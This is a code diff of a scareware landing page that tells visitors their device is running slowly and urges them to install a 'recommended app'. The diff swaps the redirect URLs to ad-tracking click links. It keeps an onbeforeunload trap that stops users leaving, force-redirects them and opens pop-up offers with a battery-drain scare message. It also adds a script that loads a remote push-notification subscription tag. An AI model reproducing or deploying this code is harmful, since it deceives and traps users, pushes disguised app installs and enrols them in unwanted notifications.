@@ -758,7 +758,7 @@ setTimeout(func, getRandomInt(120,220)*1000);
 <script type="text/javascript">
 
 var ALERT_TITLE = "Confirm Action:";
-var ALERT_TEXT = "Please wait!<br> Your " + getURLParameter("brand") + " may be running slowly.<br> To clean your device, stay on the page and install the recommended app.";
+var ALERT_TEXT = "Please wait!<br> Your " + getURLParameter("device_brand") + " may be running slowly.<br> To clean your device, stay on the page and install the recommended app.";
 var ALERT_BUTTON_TEXT = "Ok";
 
 var ALERT_TITLE_BACK = "Confirm Action:";
@@ -883,11 +883,11 @@ setTimeout(func, getRandomInt(120,220)*1000);
 		</div>
 		
         <div class="buttons">
-            <a class="button exitpoint" href="https://p01.news123.fun/?utm_medium=30155a821293745f367903f97172f025eaec3502&utm_campaign=push_subs_19_04_2021_1532">
+            <a class="button exitpoint" href="https://i.top10.run/click.php?lp=1&to_offer=2">
 				<span>
 																Update Now									</span>
             </a>
-            <a class="button cancel" href="https://p01.news123.fun/?utm_medium=30155a821293745f367903f97172f025eaec3502&utm_campaign=push_subs_19_04_2021_1532">
+            <a class="button cancel" href="https://i.top10.run/click.php?lp=1&to_offer=2">
 				<span>
 																Cancel									</span>
             </a>
@@ -930,18 +930,18 @@ window.top.location = window.location;
                 var to;
                 function repp() {
                     w.onbeforeunload = null;
-					window.open("https://cp.nowapptoday.com/t/clk?id=O8pSZgRHjPWyfx6OgU3", "_blank");
+					window.open("https://i.top10.run/click.php?lp=1&to_offer=1", "_blank");
                 };
                 function epp() {
                     to = setTimeout(function () {
-                        w.location.replace('https://p01.news123.fun/?utm_medium=30155a821293745f367903f97172f025eaec3502&utm_campaign=push_subs_19_04_2021_1532&1=closewindowaction');
+                        w.location.replace('https://i.top10.run/click.php?lp=1&to_offer=2');
                         repp();
                     }, 100);
                     return 'You should update your Android Cleaner now or your phone might be slowed down and your battery may discharge quickly.';
                 }
                 w.onbeforeunload = epp;
                 // Prevent epp firing from clicking on tracking links 压制弹框
-                var ln = d.querySelectorAll("[href='https://p01.news123.fun/?utm_medium=30155a821293745f367903f97172f025eaec3502&utm_campaign=push_subs_19_04_2021_1532']");
+                var ln = d.querySelectorAll("[href='https://i.top10.run/click.php?lp=1&to_offer=2']");
                 for (i = 0; i < ln.length; ++i) {
                     ln[i].addEventListener("click", function () {
                         repp();
@@ -957,5 +957,21 @@ window.top.location = window.location;
         }
     })(window, document);
 </script>
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&ymid='+pci+'&sw=/sw-check-permissions-b9071.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
 
+    document.head.appendChild(s);
+</script>
 </body></html>
